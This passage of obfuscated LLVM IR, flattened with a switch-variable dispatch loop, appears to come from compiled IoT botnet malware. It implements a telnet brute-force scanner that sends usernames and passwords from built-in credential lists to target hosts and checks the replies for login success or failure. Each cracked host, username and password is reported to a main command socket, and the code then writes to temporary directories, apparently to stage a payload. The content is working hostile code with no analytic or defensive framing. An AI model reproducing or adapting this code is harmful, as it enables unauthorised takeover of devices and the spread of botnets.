  %333 = load i32, i32* %6, align 4
  %334 = sext i32 %333 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %334
  call void @advance_telstate(%struct.telstate_t* %335, i32 2)
  store i32 596188933, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %7, align 4
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 -232083208, i32 -2116333529
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %6, align 4
  %343 = sext i32 %342 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %343
  call void @reset_telstate(%struct.telstate_t* %344)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  store i32 -2040469357, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i32, i32* %6, align 4
  %348 = sext i32 %347 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 7
  %351 = load i32, i32* %350, align 16
  %352 = add i32 %351, 7
  %353 = zext i32 %352 to i64
  %354 = call i64 @time(i64* null) #5
  %355 = icmp slt i64 %353, %354
  %356 = select i1 %355, i32 1728539195, i32 539248675
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %6, align 4
  %359 = sext i32 %358 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %359
  call void @reset_telstate(%struct.telstate_t* %360)
  store i32 539248675, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = load i32, i32* %6, align 4
  %364 = sext i32 %363 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %364
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %365, i32 0, i32 0
  %367 = load i32, i32* %366, align 16
  %368 = load i32, i32* %3, align 4
  %369 = load i32, i32* %6, align 4
  %370 = sext i32 %369 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 9
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @read_until_response(i32 %367, i32 %368, i8* %373, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %375 = icmp ne i32 %374, 0
  %376 = select i1 %375, i32 1894173113, i32 779476873
  store i32 %376, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = call i64 @time(i64* null) #5
  %379 = trunc i64 %378 to i32
  %380 = load i32, i32* %6, align 4
  %381 = sext i32 %380 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 7
  store i32 %379, i32* %383, align 16
  %384 = load i32, i32* %6, align 4
  %385 = sext i32 %384 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 9
  %388 = load i8*, i8** %387, align 8
  %389 = call i32 @contains_fail(i8* %388)
  %390 = icmp ne i32 %389, 0
  %391 = select i1 %390, i32 -1354235828, i32 1526547249
  store i32 %391, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  %393 = load i32, i32* %6, align 4
  %394 = sext i32 %393 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %394
  call void @advance_telstate(%struct.telstate_t* %395, i32 0)
  store i32 1924677246, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i32, i32* %6, align 4
  %398 = sext i32 %397 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %398
  call void @advance_telstate(%struct.telstate_t* %399, i32 3)
  store i32 1924677246, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i32, i32* %6, align 4
  %403 = sext i32 %402 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %403
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %404, i32 0, i32 7
  %406 = load i32, i32* %405, align 16
  %407 = add i32 %406, 7
  %408 = zext i32 %407 to i64
  %409 = call i64 @time(i64* null) #5
  %410 = icmp slt i64 %408, %409
  %411 = select i1 %410, i32 1202035538, i32 -1533976680
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i32, i32* %6, align 4
  %414 = sext i32 %413 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %414
  call void @reset_telstate(%struct.telstate_t* %415)
  store i32 -1533976680, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = load i32, i32* %6, align 4
  %419 = sext i32 %418 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 16
  %423 = load i32, i32* %6, align 4
  %424 = sext i32 %423 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 4
  %427 = load i8, i8* %426, align 2
  %428 = zext i8 %427 to i64
  %429 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %428
  %430 = load i8*, i8** %429, align 8
  %431 = load i32, i32* %6, align 4
  %432 = sext i32 %431 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %432
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %433, i32 0, i32 4
  %435 = load i8, i8* %434, align 2
  %436 = zext i8 %435 to i64
  %437 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %436
  %438 = load i8*, i8** %437, align 8
  %439 = call i64 @strlen(i8* %438) #9
  %440 = call i64 @send(i32 %422, i8* %430, i64 %439, i32 16384)
  %441 = icmp slt i64 %440, 0
  %442 = select i1 %441, i32 548094997, i32 1792282092
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i32, i32* %6, align 4
  %445 = sext i32 %444 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %445
  call void @reset_telstate(%struct.telstate_t* %446)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:447:                                    ; preds = %loopEntry
  %448 = load i32, i32* %6, align 4
  %449 = sext i32 %448 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = call i64 @send(i32 %452, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %454 = icmp slt i64 %453, 0
  %455 = select i1 %454, i32 383684580, i32 1556256960
  store i32 %455, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* %6, align 4
  %458 = sext i32 %457 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %458
  call void @reset_telstate(%struct.telstate_t* %459)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %462
  call void @advance_telstate(%struct.telstate_t* %463, i32 4)
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %6, align 4
  %466 = sext i32 %465 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 16
  %470 = load i32, i32* %3, align 4
  %471 = load i32, i32* %6, align 4
  %472 = sext i32 %471 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 9
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @read_until_response(i32 %469, i32 %470, i8* %475, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %477 = icmp ne i32 %476, 0
  %478 = select i1 %477, i32 -2007819841, i32 426555680
  store i32 %478, i32* %switchVar
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = call i64 @time(i64* null) #5
  %481 = trunc i64 %480 to i32
  %482 = load i32, i32* %6, align 4
  %483 = sext i32 %482 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %483
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %484, i32 0, i32 7
  store i32 %481, i32* %485, align 16
  %486 = load i32, i32* %6, align 4
  %487 = sext i32 %486 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 9
  %490 = load i8*, i8** %489, align 8
  %491 = call i32 @contains_fail(i8* %490)
  %492 = icmp ne i32 %491, 0
  %493 = select i1 %492, i32 1318434991, i32 -1508702618
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i32, i32* %6, align 4
  %496 = sext i32 %495 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %496
  call void @advance_telstate(%struct.telstate_t* %497, i32 0)
  store i32 18238822, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  %499 = load i32, i32* %6, align 4
  %500 = sext i32 %499 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %500
  call void @advance_telstate(%struct.telstate_t* %501, i32 5)
  store i32 18238822, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %6, align 4
  %505 = sext i32 %504 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 7
  %508 = load i32, i32* %507, align 16
  %509 = add i32 %508, 7
  %510 = zext i32 %509 to i64
  %511 = call i64 @time(i64* null) #5
  %512 = icmp slt i64 %510, %511
  %513 = select i1 %512, i32 224162849, i32 561363088
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i32, i32* %6, align 4
  %516 = sext i32 %515 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %516
  call void @reset_telstate(%struct.telstate_t* %517)
  store i32 561363088, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i32, i32* %6, align 4
  %521 = sext i32 %520 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 0
  %524 = load i32, i32* %523, align 16
  %525 = load i32, i32* %6, align 4
  %526 = sext i32 %525 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %526
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %527, i32 0, i32 5
  %529 = load i8, i8* %528, align 1
  %530 = zext i8 %529 to i64
  %531 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %530
  %532 = load i8*, i8** %531, align 8
  %533 = load i32, i32* %6, align 4
  %534 = sext i32 %533 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 5
  %537 = load i8, i8* %536, align 1
  %538 = zext i8 %537 to i64
  %539 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %538
  %540 = load i8*, i8** %539, align 8
  %541 = call i64 @strlen(i8* %540) #9
  %542 = call i64 @send(i32 %524, i8* %532, i64 %541, i32 16384)
  %543 = icmp slt i64 %542, 0
  %544 = select i1 %543, i32 1947774230, i32 -477340831
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = load i32, i32* %6, align 4
  %547 = sext i32 %546 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %547
  call void @reset_telstate(%struct.telstate_t* %548)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i32, i32* %6, align 4
  %551 = sext i32 %550 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 0
  %554 = load i32, i32* %553, align 16
  %555 = call i64 @send(i32 %554, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %556 = icmp slt i64 %555, 0
  %557 = select i1 %556, i32 2131672852, i32 706889512
  store i32 %557, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load i32, i32* %6, align 4
  %560 = sext i32 %559 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %560
  call void @reset_telstate(%struct.telstate_t* %561)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load i32, i32* %6, align 4
  %564 = sext i32 %563 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %564
  call void @advance_telstate(%struct.telstate_t* %565, i32 6)
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load i32, i32* %6, align 4
  %568 = sext i32 %567 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %568
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %569, i32 0, i32 0
  %571 = load i32, i32* %570, align 16
  %572 = load i32, i32* %3, align 4
  %573 = load i32, i32* %6, align 4
  %574 = sext i32 %573 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %574
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %575, i32 0, i32 9
  %577 = load i8*, i8** %576, align 8
  %578 = call i32 @read_until_response(i32 %571, i32 %572, i8* %577, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %579 = icmp ne i32 %578, 0
  %580 = select i1 %579, i32 2086328609, i32 -1352694497
  store i32 %580, i32* %switchVar
  br label %loopEnd

; <label>:581:                                    ; preds = %loopEntry
  %582 = call i64 @time(i64* null) #5
  %583 = trunc i64 %582 to i32
  %584 = load i32, i32* %6, align 4
  %585 = sext i32 %584 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 7
  store i32 %583, i32* %587, align 16
  %588 = load i32, i32* %6, align 4
  %589 = sext i32 %588 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 9
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @contains_fail(i8* %592)
  %594 = icmp ne i32 %593, 0
  %595 = select i1 %594, i32 -1701893330, i32 -1100797620
  store i32 %595, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = load i32, i32* %6, align 4
  %598 = sext i32 %597 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %598
  call void @advance_telstate(%struct.telstate_t* %599, i32 0)
  store i32 364692392, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  %601 = load i32, i32* %6, align 4
  %602 = sext i32 %601 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 9
  %605 = load i8*, i8** %604, align 8
  %606 = call i32 @contains_success(i8* %605)
  %607 = icmp ne i32 %606, 0
  %608 = select i1 %607, i32 -1152917812, i32 -1525141084
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  %610 = load i32, i32* %6, align 4
  %611 = sext i32 %610 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 3
  %614 = load i8, i8* %613, align 1
  %615 = zext i8 %614 to i32
  %616 = icmp eq i32 %615, 2
  %617 = select i1 %616, i32 -799717481, i32 1864630515
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i32, i32* %6, align 4
  %620 = sext i32 %619 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %620
  call void @advance_telstate(%struct.telstate_t* %621, i32 7)
  store i32 268503893, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* @mainCommSock, align 4
  %624 = load i32, i32* %6, align 4
  %625 = sext i32 %624 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %625
  %627 = call i8* @get_telstate_host(%struct.telstate_t* %626)
  %628 = load i32, i32* %6, align 4
  %629 = sext i32 %628 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 4
  %632 = load i8, i8* %631, align 2
  %633 = zext i8 %632 to i64
  %634 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %633
  %635 = load i8*, i8** %634, align 8
  %636 = load i32, i32* %6, align 4
  %637 = sext i32 %636 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 5
  %640 = load i8, i8* %639, align 1
  %641 = zext i8 %640 to i64
  %642 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %641
  %643 = load i8*, i8** %642, align 8
  %644 = call i32 (i32, i8*, ...) @sockprintf(i32 %623, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0), i8* %627, i8* %635, i8* %643)
  %645 = load i32, i32* %6, align 4
  %646 = sext i32 %645 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %646
  call void @advance_telstate(%struct.telstate_t* %647, i32 7)
  store i32 268503893, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  store i32 1532351250, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  %650 = load i32, i32* %6, align 4
  %651 = sext i32 %650 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %651
  call void @reset_telstate(%struct.telstate_t* %652)
  store i32 1532351250, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  store i32 364692392, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:655:                                    ; preds = %loopEntry
  %656 = load i32, i32* %6, align 4
  %657 = sext i32 %656 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 7
  %660 = load i32, i32* %659, align 16
  %661 = add i32 %660, 7
  %662 = zext i32 %661 to i64
  %663 = call i64 @time(i64* null) #5
  %664 = icmp slt i64 %662, %663
  %665 = select i1 %664, i32 337708733, i32 1326162784
  store i32 %665, i32* %switchVar
  br label %loopEnd

; <label>:666:                                    ; preds = %loopEntry
  %667 = load i32, i32* %6, align 4
  %668 = sext i32 %667 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %668
  call void @reset_telstate(%struct.telstate_t* %669)
  store i32 1326162784, i32* %switchVar
  br label %loopEnd

; <label>:670:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  %672 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %673 = call i32 (i8*, i8*, ...) @sprintf(i8* %672, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.117, i32 0, i32 0), i8** getelementptr inbounds ([10 x i8*], [10 x i8*]* @tempdirs, i32 0, i32 0)) #5
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 16
  %679 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %680 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %681 = call i64 @strlen(i8* %680) #9
  %682 = call i64 @send(i32 %678, i8* %679, i64 %681, i32 16384)
  %683 = icmp slt i64 %682, 0
  %684 = select i1 %683, i32 -1747548595, i32 2016031706
  store i32 %684, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  %686 = load i32, i32* %6, align 4
  %687 = sext i32 %686 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %687
  call void @reset_telstate(%struct.telstate_t* %688)
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:689:                                    ; preds = %loopEntry
  %690 = call i32 (...) @RemoveTempDirs()
  %691 = load i32, i32* @mainCommSock, align 4
  %692 = load i32, i32* %6, align 4
  %693 = sext i32 %692 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %693
  %695 = call i8* @get_telstate_host(%struct.telstate_t* %694)
  %696 = load i32, i32* %6, align 4
  %697 = sext i32 %696 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 4
  %700 = load i8, i8* %699, align 2
  %701 = zext i8 %700 to i64
  %702 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %701
  %703 = load i8*, i8** %702, align 8
  %704 = load i32, i32* %6, align 4
  %705 = sext i32 %704 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 5
  %708 = load i8, i8* %707, align 1
  %709 = zext i8 %708 to i64
  %710 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %709
  %711 = load i8*, i8** %710, align 8
